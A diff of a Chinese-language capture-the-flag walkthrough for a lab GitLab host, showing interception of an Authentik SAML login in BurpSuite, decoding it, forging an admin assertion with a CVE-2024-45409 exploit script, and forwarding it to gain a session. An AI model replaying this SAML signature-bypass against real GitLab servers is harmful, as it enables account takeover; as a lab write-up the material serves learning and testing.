@@ -384,7 +384,7 @@ GET
 
 https://gchq.github.io/CyberChef/#recipe=URL_Decode(false)From_Base64('A-Za-z0-9%2B/%3D',false,false)Raw_Inflate(0,0,'Adaptive',false,false)
 <details>
-<summary>CyberChef:只要"From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!</summary>
+<summary>CyberChef:只要"URL Decode(Treat "+" as space)","From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!</summary>
 
 ```
 <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T08:07:08Z" Destination="https://gitlab.barrier.vl/users/auth/saml/callback" ID="_4e17a6baa23c4376ae3d4585f05c5057"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_867848ec01c34e94b53ff04ce9143f97" IssueInstant="2026-03-30T08:07:08Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
@@ -620,11 +620,168 @@ GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
 ```
 </details>
 
+#### 试过这个不行，果然POST和GET是有巨大差别的
+![图片](images/2026033007.png)
+### 我找到官方给的Burpsuite拦截的路径了，重新上面的步骤
 #### 如果我们回顾一下 Gitlab 登录页面，会有一个选项可以输入凭证或者使用单点登录。此外，由于我们已经通过 Authentik 进行了身份验证，点击仪表板上的应用程序会执行单点登录流程，以让我们对这些应用程序进行身份验证。如果我们拦截 Gitlab 的单点登录过程，也就是 SAML 身份验证过程，我们就能获取一个可见的 SAML 令牌，对其进行解码，然后对其进行修改，以尝试以另一个用户的身份获取访问权限。在这种情况下我们将尝试获取管理员账户（akadmin）的访问权限。
-#### 首先，我们使用 BurpSuite 来拦截 SSO 过程。在 Authentik 控制面板中点击 Gitlab 应用程序，并按照提示操作，直到我们以 satoru 的身份成功登录到 Gitlab 。
-#### 然后，如果我们查看 BurpSuite 中的 HTTP 历史记录选项卡，应该会看到这个 GET 请求：
+#### 首先，我们使用 BurpSuite 来拦截 SSO 过程。在 Authentik 控制面板中点击 Gitlab 应用程序，并按照提示操作，直到我们以 satoru 的身份成功登录到 Gitlab 
+![图片](images/2026033006.png)
+<details>
+<summary>Burpsuite GET /users/auth/saml/callback?SAMLResponse</summary>
+
+```
+GET /users/auth/saml/callback?SAMLResponse=nVjZkpvKsn3nKxy9HxU289Sx7bgMQiAxowF4ucFQDGIUgwT6%2BoO63d5ub9vH90Z0hLqSzKyVWZlVtervPqjK9tkGfdvUPfgwVWXdP78IPz%2BNXf3cBH3eP9dBBfrnIXp2OE19xj4hz23XDE3UlE%2FfmfzeIuh70A15U7%2BZxP3np2wY2mcYvt1un274p6ZLYQxBEBhh4UUn7vP0rzftKv69%2BwoMQRwMwZv%2BBOroF%2F5RGCEe%2FheNxf0RdP2C6vPT4uXpg9L3I1DqfgjqYREhGPURwT%2FiyB7FnjHsGSH8pw8i6Ie8DoYXq8cM%2FTJFmg9lEH4Kg67LQffpWsLjEm8PB%2BOQwY%2FswFFQlmEQFcsk4uen%2F0XZAGBBTOAEHRFhEoY0EyEUSYQMTgQ4xT59%2Bfth9vyCqPvy8APqIS%2F%2Bhr8X%2F%2F26gM4QDGP%2FfiQ0MfhwDMoR%2FD5z%2FYv2szNGEej7J%2FjL6wzvnT5zb8v3Y8IesVAsi4UxQ0YxBggcQ1kSpVCUAjhAWJYiyD%2FK65%2FFGy9I83TJ%2FtiBL9DbEMRKnTSvYyGomzpfsp3fX9ZIA0PWxB%2B4Mm26fMiqX1YFijyq4iOYoo8RStR%2FLamA3s33x55e6%2BtRvx%2BrpgN%2FdX3wsc8CjKTefNogAd1SgODDwVY%2BP%2F3131P4arfvgrpPmq7qfxj%2FV1TvugrUV1A2LYg%2F9m%2FBvSH7c4%2B%2FyBj8E5hini5N83%2FM36M%2F32ft1c1LTX9JFHY1zhJRADQHOtKOdXg%2BUykS86xJFPFU%2BjRlUn7VXLnPL5i%2BN35F%2BW0Rvo5%2FrKRvC%2F9qlOmRTRjbI76NzDSz2yFXJCK%2FNp4WCVwgeSZA3BOJ7gTErvT9Pj73J2%2FUdrTc7PZpk64gcFkp9Lilj9ElFLZ9sbHWnXxuMeoC6Cgax9DoZpEqZzz2jBnLuIthOYiCMzcnxoljG0KYeoNXpzuYEMdiu8bcq4Srcb7J2dUmWaVN5tMmc1eK2jtJxAxvnAa7rDvfYHIPYTWlgsSVDpfzQfZ2CAW6M7AMnGnvvluUw5hjF353PV5JRz6drMPlMmsbtCcNc6f4k4mzrIjW0Cowc9WU8nYr4sZtZax9KpFqI%2B3OjuinLnstRSDLYhPfsG2AE5hK8ZMgT1R9YPPLJthCPr8XW70%2BOxy2HuFraeeJmrNlug7n0DvuCt4K9uvmZKLnYiIum%2BlwVy6XnZeOPl%2FLmldAMbo%2FsQzL77qdkPGk6lSnlRlVO%2FbEufadaBx6VqNZY6iNifWUz3gxReNii2unUpExQYdMkb2KB3AcENAcC0kPszOtHK3a7fUtEivUOhR2uUzp4oxJaO9V3dZ3BYmhydXcXAqShQQ5cxb7friQYWW2F1lqzXaLHK%2BqOAhVqF5J9qDgyi4cpInM4pVwKbeZyxE8KyTuPCoQPKTR3jbn9R2WPTzfngq0p7Pe2mVd5Lf8dlrlSt0Yx6t8cMScwpNSoW7d7I1KH1wPWg3dK0WMxk3QMzy%2FzzrZNDAicm8p7Zs%2BXa2VWJBvKckqvFN8%2FlbZ31XyS3XvwPxPqbskworL8fnPSHhs98myjw7gi6Yo0uEuCNx9TLmbwnOpYu0Gy2HJu7HPqUMW0kZTNcQgcjqfFpesyDfsDeE5q5c4kQOQZt9um9QTj5Yliryexa7d%2BCcSCU59qp25WReISRMIVOMJV9wriLZXJl1co9o9velo40KLEH0R7r8Jb8fz%2BqIJ6YZDD2vudss894gEm%2BMYb8pOkfQy3HhDhJV1WB0LSFnrZVTbrV%2BVZ8%2B1S81WbmvuBdFO5MrvEU2SyDl8qh95rtcE9NUR9OZpyYWgnH%2BMcy1xnCFwKcM9vgvpbvl%2FAUU4zGaTYBNC81AuzpKI73fyhmcHqUZsBZFA5QdCIkyYfTjdL8JxNZt3fpXcBdRMmIOWKiYTp8CvWly2oA0en9tWzPLzSllV6%2F1VtWLHypiuYOfhoJ1QoKb6%2FqqvZUSR0Wm9XUeVbOzNW%2BToHbgX0Kw0iOGfNrzUMscSTzd3NQLbsY2DkZUOXn40NkQLDrFz7jyTmlSdUcwGpXYZujozk7iCzj6jX5bGhDc2jVRJap4vjoGuOeHcyvP5nvXduCPweD9HYjhdjMZD8dbu1lNDH1ivXBvQXeraAZgY2svqPUaKFYMI5gX2zVPp9kqQbFFma0gr6ySIzA6WpSoUWjbPYry1HP9SBBAiT9jdluaJ5ze3oTldDfVUrC6rMPTU2PVyxzXkwJ8nJjQlFj9gF%2FMgIvt4pQCrZcZ6gpyuG09HGlFJfujRfKYiq2KucILaEmwhg2W2qcMFGzibIic1OGJSb7xrozPY1MnJxG%2FQcdx3jsIdjHCuVumWJ9KNLJnVJq5n9jRkmuWAMJz5jXSW%2Bai8jCduT%2BxTeu9sUox0lg1MamDXky2iWu3DVuFo2%2BvPHeCKMyUbXKAxaT%2B69EVWY52%2B4cSGLAngXnMTqSWz2eLuFfIFNqP0SRivl0BeJ%2FyKXUUAK%2FNxzXiSx4XNaat6kdZFK14c98hmIG2zZ6TDQUivh5XZQkYu8sagWtWJvbuCRTpqGJsHnKvXWrCde4FbOoML9KMmabeDtfSIjdicJcP8OrrZ3laEjMPWjYpsF0h8qdX22sG3eoQQ8%2BFebi3UbjWprR3EtpxjFhzQVjyepsZzyLt%2FmirV1VvIx8jSF8g6XLbYeJOV4dKZwUy24f0nG8hLY625rs8UF0lA2YMS2jMinYOpjptVj9FYgCzFC2e%2BdaDOhlnc8lnDUnLXTfzufjL4fTHiU1lI8AWkYxEdmwJarT3dHb3RnhXWkJK9fx9FvdaK7TxPMXO8ZbeB1Le2evC2pTu23NXsioTaF0klbMvNnECeea%2Bq2IxdWZCG7VTN28ZAkFFV5hWCS1dzzaFGfhPymAmsSOJgdCT5vRPgO59vKF4SICvTVXg1uc2q0e5o5O%2FWHZMJGJMfJueqJhY3uNZg1mzaouRVLWk%2FaUxBstUUX4votWmh%2BMzVJzkSemS7tFppDGzsOeflIF8rd73Y5hpppABjjIj3PMcNETB65fm%2BD6e72ZC7gYYyQd7e9cRd1rJUpbybBUPlsbVf4ZQijLx6DP2cs2c5ZIzCtqplj9%2FC4%2FU0OpHs1qqBQO3eSdheRp1K9DbnAodN8VzI8paLA8nC0JHj60Q5ldVZIvpxXx0VLeyGgzFktR23LpxAYiqGsEeS6FlNXBnzaNhwlztYdoMD%2BcqOxF6i9t6l1W%2BxNmzOwopV1vSq3VG7WwHvkJGGDpprxLx38ojwKrWZcRLRPpUtL75g3LKJ1evdoVHnEr8VQayfOux4ECpxqwoKSsv41I1QMnYoXdAD2urXQ3A%2BAPfCd5c0US%2FHxDHSIrGztZNfjkf%2F6pHLXYoUrPOdjZTTjMX4JI7QpuZgsioMGPNEHYd1gJBunay0I79i6vH2%2BfVq%2BeOJ%2Bo%2F066kLvzuR353ZX4mRM4ZnEA1fR%2FrC4xTxg7TcsYPh1wQP%2FYS%2BSPL4Y%2FKi%2BjzWfQuiBQeIn770wdB041eK9ery%2FWxCUyf5w%2B7B%2FF7v779nk1H1HIKgA93Trx09Qv6gN4NRGx2XDKD7FyOkX5m2vQBtc%2FCgjP8Pnv3GZH8G4YdPX7EuGnH%2B%2BNw%2F4PFgSRn4ERv6Fdsf4IffuPOCrX6waVAtsXx4Gf6CC795dxYqvuBQ6hhMn5%2BCOEkonGUSlgA4gmIxwxIExtABTUYkTTAARQIqYlGGCFCECGKCwWmcikiSIFkCCZJv%2Fn4GmvyIsf%2Bm4S8gl3wMYBp%2BIhLKoO8X%2FvTlt08%2B0XP00FvE5vJza7rY7JphyTeIXxhi23TD14X4qfOffHsn%2B5bTN4TD0OXhOIBffvjwKPJvvLOPMlAF%2FaeFbPZN0L4Q0Fv%2F4KAkvPzl8eMFYpjhJYq86uFFNy%2BDOO4e7yQ%2Fen69Wb821P%2F8U55vcN%2Br%2FSj9l%2BC7AOD37y%2FfnmfeHu2%2B%2FAc%3D HTTP/2
+Host: gitlab.barrier.vl
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Sec-Gpc: 1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+```
+</details>
+
+<details>
+<summary>CyberChef:只要"URL Decode(Treat "+" as space)","From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!</summary>
+	
+```
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T12:22:04Z" Destination="https://gitlab.barrier.vl/users/auth/saml/callback" ID="_19ae2ad4347c4bfbb78c0654b834a369"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_6992bd85cd2e43219516116e3e099645" IssueInstant="2026-03-30T12:22:04Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
+<ds:SignedInfo>
+<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
+<ds:Reference URI="#_6992bd85cd2e43219516116e3e099645">
+<ds:Transforms>
+<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
+<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+</ds:Transforms>
+<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
+<ds:DigestValue>fI9+uyF4ke1ieN0punbjj6g0dB9P4kdxlZ76P6ZmovA=</ds:DigestValue>
+</ds:Reference>
+</ds:SignedInfo>
+<ds:SignatureValue>hNcR4OJV3JcPghRptiIF4ivoYMcCAaFYPe0XW51KC0RmNTTdjsWYuMK7HoKTgog+
+eq+I7uJ7VcqbCJskGQErHjp26qe7ccuubOryD6ly3dYOy2hAqOQS0I38wSd34Vpb
+2Lw/+Wzex0SQ9roPTL4XMAZPARmGf+gohZ7P8zIknYWF4y/GSo2qErZO8iY09MIm
+D+N/lyUHYK06erjeQO38pzZXkltui2qBKvVv5SHWWQUqqyMG1s5OPKIZxP399D1n
++aPiLPFipJD3Ow+OEZ6fFnOgrjSDZgX9vlDeHHDodw2Ja342L6BxCHx6nU9iqGaJ
+ZBTDpNnjSA2Eu/vlRifLi9lgEbybYVKkBQaTEoWP1jkx4qGxUzIqqKYguZBnHMYk
+d1TW989BKrKChB5LSmW+PcmK9WAXRz4oS7yLcyM86GP2s6Z8Yd673Dp3MWlIH2CN
+PD9vDUeVt0eoVkFNbhj7IVQnXsNJ0dI6EbCKiH6NDy2F1sYmrJZXCF875+yoqk59
+CHhSUeVstq5bmPpqHFpPpJ0VvLDtCmbLv59UI3IKbtFx5hd+CqlJhXA4B9CfXyuI
+/tgcTRPyEz/HY3iJWk1s7hsQKhrcZpBJx+iInoOVvHUSDi63flI6wryYuIsavUMn
+zmIDcuGas8BBThrHPO24cXwg7ZPZ7mEIdCHwg59IBSk=</ds:SignatureValue>
+<ds:KeyInfo>
+<ds:X509Data>
+<ds:X509Certificate>MIIFUzCCAzugAwIBAgIQKtQS95zOTi6Uhb7Oomo4tDANBgkqhkiG9w0BAQsFADAe
+MRwwGgYDVQQDDBNhdXRoZW50aWsgMjAyNC4xMC41MB4XDTI0MTIxNDE1MzgwN1oX
+DTI1MTIxNTE1MzgwN1owVjEqMCgGA1UEAwwhYXV0aGVudGlrIFNlbGYtc2lnbmVk
+IENlcnRpZmljYXRlMRIwEAYDVQQKDAlhdXRoZW50aWsxFDASBgNVBAsMC1NlbGYt
+c2lnbmVkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw4S8GGf2x07B
+iDyFD3TKHGB9tFn0RI0FemZaCfCx2RUWzqCV+yPzB+fzC1Pf8UMgIP8dgeZmp3HQ
+G3djppDhij+I+mETvLQdSQh8rk9ytUMW1eLgNTvNEH0IH1xEJEcmHOTPwcSNrezk
+yIo0OZWGBFp8Vl3gGzLceJupdau9FUYiVOG4peUdSjrYP6xLN8IPo16Kh1+j8xD+
+jZ8Nqjkx/GR70mfgPjqSO1EACjpHyjzhsruK43dTycDbxqOoY13pRrExo7U9YlEO
+zFrpteP21sHLzd0k+80CPq/ZPWlXsIafJ18JOF+QWCD8K/HFmbCp9ihd3pQSZqka
+0Hx2zRFyxBBGwtoWvOLWk+q+bbYLdXYiSXOHaZyx8bPF93U2qPUD0Td+IeQp8unx
+SrruWV70L5Bts1iy6cQm8v/f1RF/Q0tQPpgSAaG/hxcSgOA4xLwBXR1yeGnfWP3w
+VuTrSIAUObym+gJB4gGHFPmGdny9WthMQSebbyBGFjHBclquWAT4Tg7TSGg25SYk
+Fo/XYHQ4m+TbpIA7RYsjreAkj6HOAaM8gsuX7qHLdN7w34G5l4eXviP0nFPoJ3Xv
+ZC9h6NxCuvqaHEfB+9+ce2liuE8YFYAboWJLYcMrc+BDuT0Gt5RPs8FUUCgvU+Pp
+OiDBOtLQmW9zXCQ5SLbdPU3AnEMaJysCAwEAAaNVMFMwUQYDVR0RAQH/BEcwRYJD
+OUJXckhKaFBlMnRES3JNc04yUzlJQ1RpMFpnS0RQSVhaU1pDVWxoYS5zZWxmLXNp
+Z25lZC5nb2F1dGhlbnRpay5pbzANBgkqhkiG9w0BAQsFAAOCAgEArshIX0felsel
+T8D7iexndo+s272a0iVO/hZQU6jOPkwiyM2g5KrxBKzWOBTku3xlkF/qegukcVok
++EYNXuYuRyI9OFfTZzuDNnMkJyyxd8Vwhwt5NJRLUYJlXupAvPrkf6TkfmCJlGyf
+YPzmmdPdXHCFtJxmyJoO00uLIy+03FvPEA1OiwCid8aQcFA/1u5BTSa3KZBo6BFC
+QhNL/+xXo+oMz1cZKEr8hC28iUxSvLfQAtXQtPn9gp15vLl7ZfoPCFRLg3ED1vop
+djAnWHcCs0JOoYlOt9dYSjtuiEIzNkJiM5Oge28OcBYYSXb0euYljzTbxzPo5Kt7
+hCHJzNfXXcklLFiryCOLB2EZm36ICuBLVbZiARyHb8OkRQm7OoJ/uvWuScHXnLO0
+pTSf9sH1SmDYGjk3/PDjkHHJAdaFQ21uABnfIWlmjF4suTmVIMbrtUOthnRdpX/f
+DgDb/Y551jLfXH2Y7/OXgnehw/aHv9u4TF6TYqpNwdMtGjC+9IE7+pK6Kwk/K0u7
+UMXOdBYWY4bvFphOWD1sgHQYdq2ArYPnEKUoLyl3wkadNWr2VUCmDJLCI17H3xru
+fur17k7t1pNvUajUeXqBrqgfLqVfSOgkfRhESiqVVZvY5ErZ5CQjz9cIWy2d3xDu
+GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
+</ds:X509Certificate>
+</ds:X509Data>
+</ds:KeyInfo>
+</ds:Signature><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">satoru</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2026-03-30T12:27:04Z" Recipient="https://gitlab.barrier.vl/users/auth/saml/callback"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-03-30T12:17:04Z" NotOnOrAfter="2026-03-30T12:27:04Z"/><saml:AuthnStatement AuthnInstant="2026-03-30T12:17:04Z" SessionIndex="adff6398f94e3012d8944287a75c5748e10a6c9184a104ad483736c5545940af" SessionNotOnOrAfter="2026-05-29T12:22:04Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><saml:AttributeValue>satoru@barrier.vl</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
+```
+</details>
+
+#### 将其保存saml.xml
+```
+[★]$ vi saml.xml
+[★]$ python3 CVE-2024-45409.py -r saml.xml -n akadmin
+[+] Parse response
+	Digest algorithm: sha256
+	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
+[+] Remove signature from response
+[+] Patch assertion ID
+[+] Patch assertion NameID
+[+] Patch assertion conditions
+[+] Move signature in assertion
+[+] Patch response ID
+[+] Insert malicious reference
+[+] Clone signature reference
+[+] Create status detail element
+[+] Patch digest value
+[+] Write patched file in response_patched.xml
+```
+#### CyberChef:"Raw Deflate","To Base64","URL Encode(Encode all special chars)"
+<details>
+<summary>Output</summary>
+	
+```
+7XhXj%2BLMtvY9Ev%2Bh1e8l6nFO6J3RccDYgBMGbHPzyaEcwAkHsPn1u%2Bgwu2fOvHNm7%2BtPQoJaVfXwrFRVa%2F3d%2BkVez7egrauyBU9DkZft%2FFX49blvynnlt1k7L%2F0CtPMunNu8tpnjX9B53VRdFVb586ctv9%2Fhty1ouqwqP7ZE7dfntOvqOYLcbrcvN%2BJL1SQIjqIognIIXBO1WfLXx%2Boi%2Bj18ATo%2F8jv%2FY%2F0AyvAf8DEEJR%2F4cAWEP4Cmhay%2BPkOU5ye1bXuglm3nlx0UoTj9ghIvBLrD8DmOz1Hy%2BPwkgbbLSv%2Bhy9s%2FtPAvkqzL%2FeBL4DdNBpov1xzpob4t4vddijysg4R%2Bngd%2BeIZ%2FIn19VqUXDgc0xzLxCxmT4QtJAPKFRWnyxQcRVAVDOSqOnr%2B9umj%2Byqv59kADZZed%2F37F%2FBC%2Fu9Hu%2FK5vfxyJVQSeDn7eg9%2FbD2oMV8%2FtPgxB2z4jP6JI0LpZ%2Fu3vqIWxEoMGmg487bfq1%2Be%2F%2Fh%2FNcXgQsVQY4YAkcIyjMBrDaEAAlONoknr%2BNnns2zV%2B2cZVU7Tfpj8Knvg8qZqsS4s%2FCQhQXkFe1SB6gSPohb4BkO1%2FCokhGPqAfAFD%2BBJiZPnXGwjyK6ZSlkCXa6BLq%2BgPkP8dXW3q4xT9nd4bzqszvgWSQCoxXRkBlcnq3bGrcmaYIMtPnoN24Rb6pT44yKlKtK%2BvrD5vfif63RWvgl%2F56wfheyjxH4n4c%2BjDqPy%2FnfknGfJnMQsVsD88%2BG6gxxhEahlX7wLRL6syg5mT3V%2Fz7Y998Gvvfv7L%2F9Cdj9h7KaoG%2FNW0%2FstPjv0vcuKngP3%2FSfGI61jlZv0ok2eAZUBH674MTic6QSOBM8lzNORHhjbpY1Fd%2BT9Mil8F1fcQeNuX6uGWNFYHYhWaSbqtu0yVyexaeVoo8r7smQB1HQpbi%2Bi20He76NQ6Xq%2BtGaVa75IqmU0n4DJTmX7FHMJLIK7a89JaNMqpxukLYMKw7wOjGSU6H4nIM0Y85S%2BGZaMqwd7siCAPdTCd4JsbMnPuYEBti2sqc7chXY0%2Fmvy2WMazpEqPjMne1XPpOTI5Iku7wi%2BL5miwmYdymlpMJ9JMR%2FJxr3hrlAbNCVgGwdb3o3vOuz7DL8L6erhStuI41v5yGbUl1lKGuVaPg0lwnISV08nMN7ONKWf1SiKM28xYHOlYLo2kOdnSMXG5ay4BRZGq6IavfILEN7QwiMpAl3suuyz91XRyFHZSrZcnm8cXPXLNt1m8ybg8WQRj4B3WZ8Hyd4vKMbHTeSAvy2F%2FVy%2BXtZf0R6FUNO88nUTYzuFYTlg3azEVqI1dODMzLNacw7vbO1nZzLgJR42llybe0kfWi2iGkGpCc3JVwUV9OjEl7irtwaFDQXU4y3qQnhj1YJVuq6%2FQSKUXgbjOFFqXRlzGWq9oVkdXlFmGmo3V5Uxx04mopDYEaLsLFRRmfVHk2qxX6OG6kTqxCDZXiturhLoOOnmg0mgmXvJV6vKkwImxO%2FbqdIJ0SbjbmuPijigeka2cM9YyaWut0yY81sJqmGVqWRmHq7K3pYwm4lylb83o9WrrX%2Fca9MW9UKWwX%2FotKwi7tFFMAydD95YwR%2FPIFAs1EpVbQnGqYJ%2FfEuGnmH4L9DUYP4W9S6GcBF9In4bi4yKI4fnagW%2Baqsr7uyjy9z7hb6rAJ6q17iybo%2B7GLqP3acAYVVGRncTrQnK%2BpOdsyd1QgbdamZd4MJ1o29ttmXjSwbIkSdDTyN1WR4dCfadNtBM%2F6iI5aCKJaQLpSjsV1XbqoEsLTLsnNx2rXBjEOxV7le6%2BS2%2BH0%2BKiicmSx%2FYL%2FnZLPfeA%2BstDHy3zRpX1PFh6XYjnZVAcYACpCz0Py219LOBF6m5zbaveFvwrp7XE5585DbLE20KiHwS%2B1UTsDWk6%2BcCC9hDV08%2B6LmSeN0Q%2BYfnHvJis4W9Ii7TZ5TLGB5QRppNMGmWJ2K2VpcB1coluVVQGxdEXY3HAt3vnfhEPs9G8C7P4LmJmzO61RDXZKAHHoiYUazpZEtGprqU0O83UWbHYXTdWZFsp25y5sdtrDgY2ib676gsFVRVsWKwWYaEYO%2FMW2noD7tAOo1qhxtFZCnLNHnIiWd43IVj1deT3nLz3soOxJGuwj%2BxT45n0sNFZ1awwep1isxM7SPBQOx1Z%2FQITFVluGbSIE%2FN0sQ1swYunWhlP97Rt%2BjVJRLsxlILhYlQeRtTbZjFUzJ7z8oUBg1hu6g6YONYqm3uEnmcsKpoX5Gg6uduqfrzC2JUhzyxHlNg1oshFINZclkZEbdnHy9mfTlBlwO9beRwEYXnrKudqbJzz7DILAm8TuV5mu4biH8eBDUyZI%2Fb4xdxL6C6aqcCq2b4cphO7aXrnwKAbSuhaLBvp0CrYKxJjWxmx0M4y68Tm%2FSWSDqGdGDw5bG6Cu8VGsCxjxyRu08mh3zW2yu%2BNYCxmyUogk6Uim8UyKkfO6VLNskEQjMJSPilCmF96h9%2BRu4TZ2csEp%2BzHoSZXiOspFlnMdkGt8szWa08N4M8nWjF4X2OTtneZi7KJdOZGkEsqJ4F7zUy0lM1qRbhXeLCKXErrg9hfL76yiIUZNwsBnmf9gvVkjw8qZ7XxQq0JZ4LU79BlR23NlpX3ezG57mdmPZ0YmSQY3cYqHO7uihZlb4LI3BN8udD81diKPMwS3tcPmqzd9hbMly265S0FERbhbeutJIiwX7nhOV37spBr5XZhEys9RMlxf89XFratNbkubXRr2YfU32O1dHCGyrOp%2B9EZio2rQw5HnMqPIlUG8OSNlmkewDz1R6oO7r84UV6zbME3baq6aAzyFuTTyY6VmAwMZVTNWpzBfRTGMZIerT19MszzLRs1PKHWzSCs744h7M49MeRnGbmApD%2BHhwr6YrbwdLf3%2Bu2ocoYc7473XtJL7bwaxyFiD7f01lH6arvZe6vc7Wv%2BajbnmN6d40Jc5csxnk48814UkRm5iih3q6EYV5WBov1GHWcoIV%2FNBY8Z2U3MIta3QplHsJ4SdrZPrI9CRQuyOJ1Yqb5BZoNbzSrtjoXH9aJhUxFns%2F1gXzexxXeu1Zkll9QYdd3kzDGuTFHebhJiIWHXCloyOvGlo4Rii65g4uVGx0WefYIX%2FUK96%2BdVplFGAnDWCAXPs90ABb2Xn%2B67YLibFbXumOkkFZXVXY9d6NJ8I2fNKBobAV8cC4JWxV7YHIJjxm9HJWCN89Yq4NG%2FQvqr09uh4pYbA51O6p0dc62C2YXkLU9nAjGl01lRVnzkyxaO9bxQxqqTFyeZbPtdcVC1oOn2RpeW26h2EWhJKZECxKMo7LSJXQX3GMRw4VMtvSG%2BcuV6cifTO%2B9S67dI65YnccapC2ZWr%2Bn17Yys0R5qsddcIxI8xyODq1ynhiNhbaJYXnTBeXiulYv1vtqMOXE7%2B5HuNPhhLxbSaiOqGKMQQ9NPJ3HfYMyZ6bBav%2B790x64F6G5JPHmcohtIznH23RhZ5fD4Xj1KPjiokTrdOdC1RnxiBgkiLAseYQqzgaCe5JOIDpAKbeMZ9pBmLFlf%2Fv6%2Fgr9%2Bbr9JP64lB%2FjT1f2D9f6e0ll98EJhN37SIdVvCo9yfBV7sNa7J%2FKe%2BwL9irJopfHA97v5n3Z1iCEVABsMPjQOEVWvldnb5g%2F%2Fp1YlXH22PgoGt9e%2FL9vJoTFPAB%2BA5qPUvAXQA%2Btn%2FSqM0qj4eMONJ%2BKSexRTJLcHGdgu2ULmdYZrCD%2Fq2YLbGS8KfYLCj9NvXOFK6LsMd0%2B6AkA2gz2Tn4sdDHmrRX0B%2FzfOylzHnIrH4U4KKAuT6%2FDfyijP9Bt2ImBPNQyAsPXZz%2BKY5rg2JgjAYFieMRyJImzjM9QIcWQLMBQnw45jCVh74j0I5IlGIIOKYqkOBL14%2B94f0D6M2dojw4MH9b5LBJz2NSD9da33%2Fb9wnn4WAfFJvy6VU1kwuYhtDeIXovKumq6d0f8EvwXcz%2FIvtv0g2HXNVnQd%2BAfJ54eQf69Um3DFBR%2B%2BwWWp23l168l6619VK0UAj9Z9GhedCMCtciKFoFrs9yPoubRJvsZ%2Be313fpd1fT%2F8%2B%2Fw%2FKD747Kfpf9L8EmB95mP1s33zs5H5%2FbbvwA%3D
+```
+</details>
+
 #### 现在我们可以复制 response.xml 中的值，并将其粘贴到 BurpSuite 中 Responder 里等待处理的请求中，替换原有的 SAML。
+#### 在Burpsuite粘贴，恢复浏览器的网络，Burpsuite点击'Forward'
+<details>
+<summary>查看 BurpSuite 中的 HTTP History</summary>
+	
+```
+HTTP/2 302 Found
+Server: nginx
+Date: Mon, 30 Mar 2026 12:54:36 GMT
+Content-Type: text/html; charset=utf-8
+Location: https://gitlab.barrier.vl/
+Cache-Control: no-cache
+Content-Security-Policy: 
+Permissions-Policy: interest-cohort=()
+Set-Cookie: known_sign_in=TFQwZ3NxbWxRS1ljUzkySXFyNUtEQThKMXlvNUtxMWFmbk9uSHdxUXlzcmFJbTk1WnZ0OTI2WWw3M1EwMlBJNDRybG10VWRKZHhpc25yaHdrN0h0VXBLbnI5d3VxUzlkYS9QZUlCQ0I2cEt6R3FTNHFMdzR0d3NWTjd1VVR2ZkMtLVNnSUZyYjZWVVgyWmV5ckJTTU4vVXc9PQ%3D%3D--4b896f4299cad578f7e7df1ec908df5c9654cb44; path=/; expires=Mon, 13 Apr 2026 12:54:36 GMT; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=d7ffb73d24dd8373260293048077e739; path=/; secure; HttpOnly; SameSite=None
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Gitlab-Meta: {"correlation_id":"01KMZCYWMVC88BGPSJBV3S0C6B","version":"1"}
+X-Permitted-Cross-Domain-Policies: none
+X-Request-Id: 01KMZCYWMVC88BGPSJBV3S0C6B
+X-Runtime: 0.473371
